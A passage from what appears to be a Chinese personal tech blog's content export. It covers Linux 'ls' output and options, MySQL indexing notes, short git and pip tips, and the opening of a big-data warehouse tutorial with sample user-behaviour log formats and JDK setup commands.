Pokémon.GO_com.nianticlabs.pokemongo.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  6447294 Aug  9 16:15 Psiphon3.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1  9789834 Aug  9 19:39 yxzx.apk</span><br><span class="line">-rw-r--r-- 1 aijian.shi tdsw1 47297545 Aug  9 19:50 Zombiesrunfree.apk</span><br><span class="line">drwxr-xr-x 2 aijian.shi tdsw1     4096 Aug  1 14:58 照片资料</span><br><span class="line">drwxr-xr-x 3 aijian.shi tdsw1     4096 Aug  3 14:56 软件下载</span><br><span class="line">drwxr-xr-x 4 aijian.shi tdsw1     4096 Aug  5 13:16 邮件附件下载</span><br><span class="line">drwxr-xr-x 2 aijian.shi tdsw1     4096 Aug  3 16:17 雏鹰日志</span><br></pre></td></tr></table></figure><p>在这里，total 207440表示当前目录下文件大小总和为207440K。<br>以最后一行输出为例，<br>drwxr-xr-x 第一个字符有3种情况：“-”表示普通文件，“d”代表目录，“l”代表连接文件，“b”代表设备文件。显然最后的“雏鹰日志”是一个目录文件。<br>后面的9个字符每3个为一组，分别代表文件所有者、文件所有者所在用户组、其它用户对文件拥有的权限。每组中“r”、“w”、“x”三个字符分别代表读、写、执行的权限，若没有其中的任何一个权限则用“-”表示。执行的权限有两个字符可选，最常见的一个是“x”代表可执行，另一个是“s”代表套接口文件。<br>紧接着的数字“2”代表 “雏鹰日志”这个目录下的目录文件数目（这个数目=隐藏目录数目+普通目录数目）。（如果这只是一个普通文件，那“2”就代表这个文件有两个别名，这个文件被人创建了一个硬链接文件）<br>后面的aijian.shi代表这个文件（目录）的属主（Owner）为用户aijian.shi<br>再接下来的tdsw1代表这个文件（目录）所属的用户组（Group）为组tdsw1（本人软件组）<br>4096 代表文件的大小（字节数），目录的大小总是为4096字节。<br>Aug   3   16：17代表文件（目录）的修改时间。<br>“雏鹰日志“代表文件（目录）在名字。<br>​</p><p><strong>3）文件名颜色的含义</strong><br>默认色代表普通文件。例：install.log<br>绿色代表可执行文件。例：rc.news<br>红色代表tar包文件。    例：vim-7.1.tar.bz2<br>​蓝色代表目录文件。   例：aa<br>​水红代表图象文件。   例：Sunset.jpg<br>​青色代表链接文件。   例：rc4.d  （此类文件相当于快捷方式）<br>​黄色代表设备文件。   例：fd0<br>ps：设置显示彩色目录列表方法<br>打开/etc/bashrc, 加入如下一行:<br>alias ls=”ls –color”<br>下次启动bash时就可以像在Slackware里那样显示彩色的目录列表了, 其中颜色的含义如下:</p><ol><li>蓝色–&gt;目录</li><li>绿色–&gt;可执行文件</li><li>红色–&gt;压缩文件</li><li>浅蓝色–&gt;链接文件</li><li>灰色–&gt;其他文件<br>​</li></ol><p><strong>4）几个比较常用的指令和参数。</strong><br>​</p><p>只列出子目录</p><ol><li>ls -F | grep /$ 或者 alias sub = “ls -F | grep /$”(linux)</li><li>ls -l | grep “^d” 或者 ls -lL | grep “^d” (Solaris)<br>计算当前目录下的文件数和目录数<br>下面命令可以分别计算当前目录下的文件和目录个数：<h1 id="ls-l-grep-“-“-wc-l-—-to-count-files"><a href="#ls-l-grep-“-“-wc-l-—-to-count-files" class="headerlink" title="ls -l * |grep “^-“|wc -l —- to count files"></a>ls -l * |grep “^-“|wc -l —- to count files</h1><h1 id="ls-l-grep-“-d”-wc-l-—–-to-count-dir"><a href="#ls-l-grep-“-d”-wc-l-—–-to-count-dir" class="headerlink" title="ls -l * |grep “^d”|wc -l —– to count dir"></a>ls -l * |grep “^d”|wc -l —– to count dir</h1>​</li></ol><p>-t按最后修改时间排序。<br>-S按文件大小排序。（大写的S）<br>-r排序时按倒序。<br>-h显示文件大小时增加可读性（例：1K 234M 2G）<br>​</p><p>​</p><p><strong>5）其他</strong><br>-a 列出目录下的所有文件，包括以 . 开头的隐含文件。<br>-b 把文件名中不可输出的字符用反斜杠加字符编号(就象在C语言里一样)的形式列出。<br>-c 输出文件的 i 节点的修改时间，并以此排序。<br>-d 将目录象文件一样显示，而不是显示其下的文件。<br>-e 输出时间的全部信息，而不是输出简略信息。<br>-f -U 对输出的文件不排序。<br>-g 无用。<br>-i 输出文件的 i 节点的索引信息。<br>-k 以 k 字节的形式表示文件的大小。<br>-l 列出文件的详细信息。<br>-m 横向输出文件名，并以“，”作分格符。<br>-n 用数字的 UID,GID 代替名称。<br>-o 显示文件的除组信息外的详细信息。<br>-p -F 在每个文件名后附上一个字符以说明该文件的类型，“*”表示可执行的普通<br>文件；“/”表示目录；“@”表示符号链接；“|”表示FIFOs；“=”表示套<br>接字(sockets)。<br>-q 用?代替不可输出的字符。<br>-r 对目录反向排序。<br>-s 在每个文件名后输出该文件的大小。<br>-t 以时间排序。<br>-u 以文件上次被访问的时间排序。<br>-x 按列输出，横向排序。<br>-A 显示除 “.”和“..”外的所有文件。<br>-B 不输出以 “~”结尾的备份文件。<br>-C 按列输出，纵向排序。<br>-G 输出文件的组的信息。<br>-L 列出链接文件名而不是链接到的文件。<br>-N 不限制文件长度。<br>-Q 把输出的文件名用双引号括起来。<br>-R 列出所有子目录下的文件。<br>-S 以文件大小排序。<br>-X 以文件的扩展名(最后一个 . 后的字符)排序。<br>-1 一行只输出一个文件。<br>–color=no 不显示彩色文件名<br>–help 在标准输出上显示帮助信息。<br>–version 在标准输出上输出版本信息并退出。</p><blockquote><p>参考资料：<a href="https://www.cnblogs.com/aijianshi/p/5756346.html">https://www.cnblogs.com/aijianshi/p/5756346.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL知识点梳理s</title>
      <link href="/2022/02/09/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/"/>
      <url>/2022/02/09/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/</url>
      
        <content type="html"><![CDATA[<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>索引是帮助MySQL高效获取数据的数据结构，简单理解为：排好序的快速查找数据结构</p><h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>数据和程序都有聚集成群的倾向，之前被查询过的数据很可能再次被宣询</p><h3 id="磁盈预读"><a href="#磁盈预读" class="headerlink" title="磁盈预读"></a>磁盈预读</h3><p>在磁盘跟内存进行交互的时候，有一个最小的逻辑单元，称之为页，datapage，页跟操作系统 相关，一般情况下是4k或者8k，每次在进行数据交互的时候，一定读取的是页的垫数倍<br>​</p><p>mysql的innodb在进行数据读取的时候也是跟页相关的，datapagesize，默认情况下是16kb<br>​</p><p>索引是存储在磁盘中的，但是会预先加载到内存中，而且在进行加载的时候是分页加载</p><h2 id="B树和B-树"><a href="#B树和B-树" class="headerlink" title="B树和B+树"></a>B树和B+树</h2><p>B+Tree是在BTree的基础之上做的一种优化，变化如下：</p><ol><li>B+Tree每个节点可以包含更多的节点，这个做的原因有两个，第一个原因是为了降低树的高度，第二个原因是将数据范围变为多个区间，区间越多，数据检索越快 </li><li>非叶子节点存储key，叶子节点存储key和数据</li><li>叶子节点两两指针相互连接（符合磁盘的预读特性)，顺序查询性能更高<h3 id="MySQL为什么要设置成主键自增"><a href="#MySQL为什么要设置成主键自增" class="headerlink" title="MySQL为什么要设置成主键自增"></a>MySQL为什么要设置成主键自增</h3>如果不自增可能会导致页分裂，分裂后会需要增加父节点对子节点的指针，如果设置成自增的就不需要页分裂了<h2 id="聚簇索引和非聚簇索引"><a href="#聚簇索引和非聚簇索引" class="headerlink" title="聚簇索引和非聚簇索引"></a>聚簇索引和非聚簇索引</h2>索引和数据放在一起就是聚簇索引<br>​</li></ol><p>​</p><p><img src="http://106.12.125.218/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/0.png" alt="非聚簇索引" title="非聚簇索引"></p><h3 id="一个表中可以由多少个索引？"><a href="#一个表中可以由多少个索引？" class="headerlink" title="一个表中可以由多少个索引？"></a>一个表中可以由多少个索引？</h3><p>肯定不是只有一个索引，可以根据用户需要来创建索引<br><img src="http://106.12.125.218/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/1.png" alt="再试一下" title="再试一下"></p><h3 id="如果一个表中由3个索引，那么数据要存储几份？"><a href="#如果一个表中由3个索引，那么数据要存储几份？" class="headerlink" title="如果一个表中由3个索引，那么数据要存储几份？"></a>如果一个表中由3个索引，那么数据要存储几份？</h3><p>注意，一个表中无论由多少索引，数据只存储一份 </p><h3 id="如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？"><a href="#如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？" class="headerlink" title="如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？"></a>如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？</h3><p>回表<br>数据在进行插入的时候，是必须要跟索引存储在一起的，在innodb的存储引擎中，如果表中由主键，那么数据跟主键放在一起，如果没有主键，跟唯一键放在一起，如果没有唯一键，会生成一 个6字节的rowid，数据跟rowid放在一起，无论如果，总是需要一个索引列的<br><img src="http://106.12.125.218/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86s/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL知识点梳理</title>
      <link href="/2022/02/08/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/"/>
      <url>/2022/02/08/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>索引是帮助MySQL高效获取数据的数据结构，简单理解为：排好序的快速查找数据结构</p><h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>数据和程序都有聚集成群的倾向，之前被查询过的数据很可能再次被宣询</p><h3 id="磁盈预读"><a href="#磁盈预读" class="headerlink" title="磁盈预读"></a>磁盈预读</h3><p>在磁盘跟内存进行交互的时候，有一个最小的逻辑单元，称之为页，datapage，页跟操作系统 相关，一般情况下是4k或者8k，每次在进行数据交互的时候，一定读取的是页的垫数倍<br>​</p><p>mysql的innodb在进行数据读取的时候也是跟页相关的，datapagesize，默认情况下是16kb<br>​</p><p>索引是存储在磁盘中的，但是会预先加载到内存中，而且在进行加载的时候是分页加载</p><h2 id="B树和B-树"><a href="#B树和B-树" class="headerlink" title="B树和B+树"></a>B树和B+树</h2><p>B+Tree是在BTree的基础之上做的一种优化，变化如下：</p><ol><li>B+Tree每个节点可以包含更多的节点，这个做的原因有两个，第一个原因是为了降低树的高度，第二个原因是将数据范围变为多个区间，区间越多，数据检索越快 </li><li>非叶子节点存储key，叶子节点存储key和数据</li><li>叶子节点两两指针相互连接（符合磁盘的预读特性)，顺序查询性能更高<h3 id="MySQL为什么要设置成主键自增"><a href="#MySQL为什么要设置成主键自增" class="headerlink" title="MySQL为什么要设置成主键自增"></a>MySQL为什么要设置成主键自增</h3>如果不自增可能会导致页分裂，分裂后会需要增加父节点对子节点的指针，如果设置成自增的就不需要页分裂了<h2 id="聚簇索引和非聚簇索引"><a href="#聚簇索引和非聚簇索引" class="headerlink" title="聚簇索引和非聚簇索引"></a>聚簇索引和非聚簇索引</h2>索引和数据放在一起就是聚簇索引<br>​</li></ol><p>​</p><p><img src="http://106.12.125.218/medias/medias/MySQL%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/0.png" alt="非聚簇索引"></p><h3 id="一个表中可以由多少个索引？"><a href="#一个表中可以由多少个索引？" class="headerlink" title="一个表中可以由多少个索引？"></a>一个表中可以由多少个索引？</h3><p>肯定不是只有一个索引，可以根据用户需要来创建索引</p><h3 id="如果一个表中由3个索引，那么数据要存储几份？"><a href="#如果一个表中由3个索引，那么数据要存储几份？" class="headerlink" title="如果一个表中由3个索引，那么数据要存储几份？"></a>如果一个表中由3个索引，那么数据要存储几份？</h3><p>注意，一个表中无论由多少索引，数据只存储一份 </p><h3 id="如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？"><a href="#如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？" class="headerlink" title="如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？"></a>如果数据只存储一份的话，那么其他的素引怎么检素到数据呢？</h3><p>回表<br>数据在进行插入的时候，是必须要跟索引存储在一起的，在innodb的存储引擎中，如果表中由主键，那么数据跟主键放在一起，如果没有主键，跟唯一键放在一起，如果没有唯一键，会生成一 个6字节的rowid，数据跟rowid放在一起，无论如果，总是需要一个索引列的</p>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日报20220203</title>
      <link href="/2022/02/03/%E6%97%A5%E6%8A%A520220203/"/>
      <url>/2022/02/03/%E6%97%A5%E6%8A%A520220203/</url>
      
        <content type="html"><![CDATA[<p>​</p><h2 id="今日完成情况"><a href="#今日完成情况" class="headerlink" title="今日完成情况"></a>今日完成情况</h2><ul><li><p><input checked="" disabled="" type="checkbox">  任务全部完成</p><h3 id="未完成"><a href="#未完成" class="headerlink" title="未完成"></a>未完成</h3></li><li><p>无</p></li></ul><hr><h2 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h2><ol><li>复习leetcode</li><li>深度学习在推荐系统中的应用</li></ol><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以后每天写日报</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git无法clone</title>
      <link href="/2022/01/28/git%E6%97%A0%E6%B3%95clone/"/>
      <url>/2022/01/28/git%E6%97%A0%E6%B3%95clone/</url>
      
        <content type="html"><![CDATA[<p>将clone后链接中的https改为git。</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip安装requirements.txt</title>
      <link href="/2022/01/28/pip%E5%AE%89%E8%A3%85requirements.txt/"/>
      <url>/2022/01/28/pip%E5%AE%89%E8%A3%85requirements.txt/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础</title>
      <link href="/2022/01/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="http://106.12.125.218/medias/pdf/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言基础</title>
      <link href="/2022/01/22/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/22/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="http://106.12.125.218/medias/pdf/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> scala </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尚硅谷大数据项目之电商数仓（用户行为采集平台）V5.0</title>
      <link href="/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/"/>
      <url>/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/</url>
      
        <content type="html"><![CDATA[<p>尚硅谷大数据项目之电商数仓（用户行为采集平台）</p><p>(作者：尚硅谷大数据研发部)</p><p>版本：V5.0</p><h2 id="第1章-数据仓库概念"><a href="#第1章-数据仓库概念" class="headerlink" title="第1章 数据仓库概念"></a>第1章 数据仓库概念</h2><h2 id="第2章-项目需求及架构设计"><a href="#第2章-项目需求及架构设计" class="headerlink" title="第2章 项目需求及架构设计"></a>第2章 项目需求及架构设计</h2><h3 id="项目需求分析"><a href="#项目需求分析" class="headerlink" title="项目需求分析"></a>项目需求分析</h3><h3 id="项目框架"><a href="#项目框架" class="headerlink" title="项目框架"></a>项目框架</h3><h4 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h4><h4 id="系统数据流程设计"><a href="#系统数据流程设计" class="headerlink" title="系统数据流程设计"></a>系统数据流程设计</h4><h4 id="框架版本选型"><a href="#框架版本选型" class="headerlink" title="框架版本选型"></a>框架版本选型</h4><h4 id="服务器选型"><a href="#服务器选型" class="headerlink" title="服务器选型"></a>服务器选型</h4><h4 id="集群资源规划设计"><a href="#集群资源规划设计" class="headerlink" title="集群资源规划设计"></a>集群资源规划设计</h4><p>2）测试集群服务器规划</p><table><thead><tr><th>服务名称</th><th>子服务</th><th>服务器 hadoop102</th><th>服务器 hadoop103</th><th>服务器 hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>√</td><td></td><td></td></tr><tr><td></td><td>DataNode</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>SecondaryNameNode</td><td></td><td></td><td>√</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>Resourcemanager</td><td></td><td>√</td><td></td></tr><tr><td>Zookeeper</td><td>Zookeeper Server</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume(采集日志)</td><td>Flume</td><td>√</td><td>√</td><td></td></tr><tr><td>Kafka</td><td>Kafka</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume（消费Kafka）</td><td>Flume</td><td></td><td></td><td>√</td></tr><tr><td>Hive</td><td>Hive</td><td>√</td><td></td><td></td></tr><tr><td>MySQL</td><td>MySQL</td><td>√</td><td></td><td></td></tr><tr><td>DataX</td><td>DataX</td><td>√</td><td></td><td></td></tr><tr><td>Maxwell</td><td>Maxwell</td><td>√</td><td></td><td></td></tr><tr><td>Presto</td><td>Coordinator</td><td>√</td><td></td><td></td></tr><tr><td></td><td>Worker</td><td>√</td><td>√</td><td>√</td></tr><tr><td>DolphinScheduler</td><td>MasterServer</td><td>√</td><td></td><td></td></tr><tr><td></td><td>WorkerServer</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Druid</td><td>Druid</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Kylin</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Hbase</td><td>HMaster</td><td>√</td><td></td><td></td></tr><tr><td></td><td>HRegionServer</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Superset</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Atlas</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Solr</td><td>Jar</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><h2 id="第3章-用户行为日志"><a href="#第3章-用户行为日志" class="headerlink" title="第3章 用户行为日志"></a>第3章 用户行为日志</h2><h3 id="用户行为日志概述"><a href="#用户行为日志概述" class="headerlink" title="用户行为日志概述"></a>用户行为日志概述</h3><p>用户行为日志的内容，主要包括用户的各项<strong>行为信息</strong>以及行为所处的<strong>环境信息</strong>。收集这些信息的主要目的是优化产品和为各项分析统计指标提供数据支撑。收集这些信息的手段通常为<strong>埋点</strong>。</p><p>目前主流的埋点方式，有代码埋点（前端/后端）、可视化埋点、全埋点等。</p><p><strong>代码埋点</strong>是通过调用埋点SDK函数，在需要埋点的业务逻辑功能位置调用接口，上报埋点数据。例如，我们对页面中的某个按钮埋点后，当这个按钮被点击时，可以在这个按钮对应的<br>OnClick 函数里面调用SDK提供的数据发送接口，来发送数据。</p><p><strong>可视化埋点</strong>只需要研发人员集成采集<br>SDK，不需要写埋点代码，业务人员就可以通过访问分析平台的“圈选”功能，来“圈”出需要对用户行为进行捕捉的控件，并对该事件进行命名。圈选完毕后，这些配置会同步到各个用户的终端上，由采集<br>SDK 按照圈选的配置自动进行用户行为数据的采集和发送。</p><p><strong>全埋点</strong>是通过在产品中嵌入SDK，前端自动采集页面上的全部用户行为事件，上报埋点数据，相当于做了一个统一的埋点。然后再通过界面配置哪些数据需要在系统里面进行分析。</p><h3 id="用户行为日志内容"><a href="#用户行为日志内容" class="headerlink" title="用户行为日志内容"></a>用户行为日志内容</h3><p>本项目收集和分析的用户行为信息主要有<strong>页面浏览记录、动作记录、曝光记录、启动记录和错误记录。</strong></p><h4 id="页面浏览记录"><a href="#页面浏览记录" class="headerlink" title="页面浏览记录"></a>页面浏览记录</h4><p>页面浏览记录，记录的是访客对页面的浏览行为，该行为的环境信息主要有用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息及页面信息等。</p><h4 id="动作记录"><a href="#动作记录" class="headerlink" title="动作记录"></a>动作记录</h4><p>动作记录，记录的是用户的业务操作行为，该行为的环境信息主要有用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息及动作目标对象信息等。</p><h4 id="曝光记录"><a href="#曝光记录" class="headerlink" title="曝光记录"></a>曝光记录</h4><p>曝光记录，记录的是曝光行为，该行为的环境信息主要有用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息及曝光对象信息等。</p><h4 id="启动记录"><a href="#启动记录" class="headerlink" title="启动记录"></a>启动记录</h4><p>启动记录，记录的是用户启动应用的行为，该行为的环境信息主要有用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息、启动类型及开屏广告信息等。</p><h4 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h4><p>启动记录，记录的是用户在使用应用过程中的报错行为，该行为的环境信息主要有用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息、以及可能与报错相关的页面信息、动作信息、曝光信息和动作信息。</p><h3 id="用户行为日志格式"><a href="#用户行为日志格式" class="headerlink" title="用户行为日志格式"></a>用户行为日志格式</h3><p>我们的日志结构大致可分为两类，一是页面日志，二是启动日志。</p><h4 id="页面日志"><a href="#页面日志" class="headerlink" title="页面日志"></a>页面日志</h4><p>页面日志，以页面浏览为单位，即一个页面浏览记录，生成一条页面埋点日志。一条<strong>完整</strong>的页面日志包含，一个页面浏览记录，若干个用户在该页面所做的动作记录，若干个该页面的曝光记录，以及一个在该页面发生的报错记录。除上述行为信息，页面日志还包含了这些行为所处的各种环境信息，包括用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息等。</p><p>{</p><p>“common”: { – 环境信息</p><p>“ar”: “230000”, – 地区编码</p><p>“ba”: “iPhone”, – 手机品牌</p><p>“ch”: “Appstore”, – 渠道</p><p>“is_new”:<br>“1”,–是否首日使用，首次使用的当日，该字段值为1，过了24:00，该字段置为0。</p><p>“md”: “iPhone 8”, – 手机型号</p><p>“mid”: “YXfhjAYH6As2z9Iq”, – 设备id</p><p>“os”: “iOS 13.2.9”, – 操作系统</p><p>“uid”: “485”, – 会员id</p><p>“vc”: “v2.1.134” – app版本号</p><p>},</p><p>“actions”: [ –动作(事件)</p><p>{</p><p>“action_id”: “favor_add”, –动作id</p><p>“item”: “3”, –目标id</p><p>“item_type”: “sku_id”, –目标类型</p><p>“ts”: 1585744376605 –动作时间戳</p><p>}</p><p>],</p><p>“displays”: [</p><p>{</p><p>“displayType”: “query”, – 曝光类型</p><p>“item”: “3”, – 曝光对象id</p><p>“item_type”: “sku_id”, – 曝光对象类型</p><p>“order”: 1, –出现顺序</p><p>“pos_id”: 2 –曝光位置</p><p>},</p><p>{</p><p>“displayType”: “promotion”,</p><p>“item”: “6”,</p><p>“item_type”: “sku_id”,</p><p>“order”: 2,</p><p>“pos_id”: 1</p><p>},</p><p>{</p><p>“displayType”: “promotion”,</p><p>“item”: “9”,</p><p>“item_type”: “sku_id”,</p><p>“order”: 3,</p><p>“pos_id”: 3</p><p>},</p><p>{</p><p>“displayType”: “recommend”,</p><p>“item”: “6”,</p><p>“item_type”: “sku_id”,</p><p>“order”: 4,</p><p>“pos_id”: 2</p><p>},</p><p>{</p><p>“displayType”: “query “,</p><p>“item”: “6”,</p><p>“item_type”: “sku_id”,</p><p>“order”: 5,</p><p>“pos_id”: 1</p><p>}</p><p>],</p><p>“page”: { –页面信息</p><p>“during_time”: 7648, – 持续时间毫秒</p><p>“item”: “3”, – 目标id</p><p>“item_type”: “sku_id”, – 目标类型</p><p>“last_page_id”: “login”, – 上页类型</p><p>“page_id”: “good_detail”, – 页面ID</p><p>“sourceType”: “promotion” – 来源类型</p><p>},</p><p>“err”:{ –错误</p><p>“error_code”: “1234”, –错误码</p><p>“msg”: “***********“ –错误信息</p><p>},</p><p>“ts”: 1585744374423 –跳入时间戳</p><p>}</p><h4 id="启动日志"><a href="#启动日志" class="headerlink" title="启动日志"></a>启动日志</h4><p>启动日志以启动为单位，及一次启动行为，生成一条启动日志。一条完整的启动日志包括一个启动记录，一个本次启动时的报错记录，以及启动时所处的环境信息，包括用户信息、时间信息、地理位置信息、设备信息、应用信息、渠道信息等。</p><p>{</p><p>“common”: {</p><p>“ar”: “370000”,</p><p>“ba”: “Honor”,</p><p>“ch”: “wandoujia”,</p><p>“is_new”: “1”,</p><p>“md”: “Honor 20s”,</p><p>“mid”: “eQF5boERMJFOujcp”,</p><p>“os”: “Android 11.0”,</p><p>“uid”: “76”,</p><p>“vc”: “v2.1.134”</p><p>},</p><p>“start”: {</p><p>“entry”: “icon”, –icon手机图标 notice 通知 install 安装后启动</p><p>“loading_time”: 18803, –启动加载时间</p><p>“open_ad_id”: 7, –广告页ID</p><p>“open_ad_ms”: 3449, – 广告总共播放时间</p><p>“open_ad_skip_ms”: 1989 – 用户跳过广告时点</p><p>},</p><p>“err”:{ –错误</p><p>“error_code”: “1234”, –错误码</p><p>“msg”: “***********“ –错误信息</p><p>},</p><p>“ts”: 1585744304000</p><p>}</p><h3 id="模拟生成用户行为日志"><a href="#模拟生成用户行为日志" class="headerlink" title="模拟生成用户行为日志"></a>模拟生成用户行为日志</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p><strong>1）服务器准备</strong></p><p>安装如下文档配置步骤，准备hadoop102、hadoop103、hadoop104三台虚拟机。</p><p>如需使用阿里云服务器，可参考以下文档。</p><p><strong>2）JDK准备</strong></p><p><strong>（1）卸载现有JDK（3台节点）</strong></p><p>[atguigu@hadoop102 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p>[atguigu@hadoop103 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p>[atguigu@hadoop104 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p><strong>（2）用SecureCRT工具将JDK导入到hadoop102的/opt/software文件夹下面</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d44e9b5727d45ae6a1f4733ddb23b743.png"></p><p><strong>（3） “alt+p”进入sftp模式</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/6974407b7e3e788b5446b8bcd2b36466.png"></p><p><strong>（4）选择jdk1.8拖入工具</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b6cdad0ae4a090f67fdc0f30ba9665bc.png"></p><p><strong>（5）在Linux系统下的opt目录中查看软件包是否导入成功</strong></p><p>[atguigu@hadoop102 software]## ls /opt/software/</p><p>看到如下结果：</p><p>jdk-8u212-linux-x64.tar.gz</p><p><strong>（6）解压JDK到/opt/module目录下</strong></p><p>[atguigu@hadoop102 software]## tar -zxvf jdk-8u212-linux-x64.tar.gz -C<br>/opt/module/</p><p><strong>（7）配置JDK环境变量</strong></p><p>（1）新建/etc/profile.d/my_env.sh文件</p><p>[atguigu@hadoop102 module]## sudo vim 